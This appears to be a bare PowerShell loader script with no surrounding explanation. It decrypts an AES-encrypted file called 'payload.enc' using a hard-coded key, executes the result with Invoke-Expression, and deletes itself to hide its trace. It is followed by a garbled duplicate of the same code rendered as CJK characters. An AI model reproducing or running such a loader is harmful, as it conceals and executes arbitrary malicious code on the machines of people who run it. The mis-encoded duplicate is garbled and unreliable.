 $key = [System.Text.Encoding]::UTF8.GetBytes("0123456789abcdef")
$iv  = [System.Text.Encoding]::UTF8.GetBytes("abcdef9876543210")

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = "CBC"
$AES.Padding = "PKCS7"

$enc = Get-Content "L:\payload.enc" -Raw
$bytes = [System.Convert]::FromBase64String($enc)
$decryptor = $AES.CreateDecryptor()
$plaintext = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
$script = [System.Text.Encoding]::UTF8.GetString($plaintext)

Invoke-Expression $script

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path

Unicode: 欤祥㴠嬠祓瑳浥吮硥⹴湅潣楤杮㩝唺䙔⸸敇䉴瑹獥∨㄰㌲㔴㜶㤸扡摣晥⤢␊癩†‽卛獹整⹭敔瑸䔮据摯湩嵧㨺呕㡆䜮瑥祂整⡳愢换敤㥦㜸㔶㌴ㄲ∰਩␊䕁⁓‽敎⵷扏敪瑣匠獹整⹭敓畣楲祴䌮祲瑰杯慲桰⹹敁䵳湡条摥␊䕁⹓敋⁹‽欤祥␊䕁⹓噉㴠␠癩␊䕁⹓潍敤㴠∠䉃≃␊䕁⹓慐摤湩⁧‽倢䍋㝓ਢ␊湥⁣‽敇⵴潃瑮湥⁴䰢尺慰汹慯⹤湥≣ⴠ慒੷戤瑹獥㴠嬠祓瑳浥䌮湯敶瑲㩝䘺潲䉭獡㙥匴牴湩⡧攤据਩搤捥祲瑰牯㴠␠䕁⹓牃慥整敄牣灹潴⡲਩瀤慬湩整瑸㴠␠敤牣灹潴⹲牔湡晳牯䙭湩污求捯⡫戤瑹獥‬ⰰ␠祢整⹳敌杮桴਩猤牣灩⁴‽卛獹整⹭敔瑸䔮据摯湩嵧㨺呕㡆䜮瑥瑓楲杮␨汰楡瑮硥⥴ਊ湉潶敫䔭灸敲獳潩⁮猤牣灩ੴ⌊匠汥ⵦ敤敬整刊浥癯ⵥ瑉浥␠祍湉潶慣楴湯䴮䍹浯慭摮倮瑡੨

]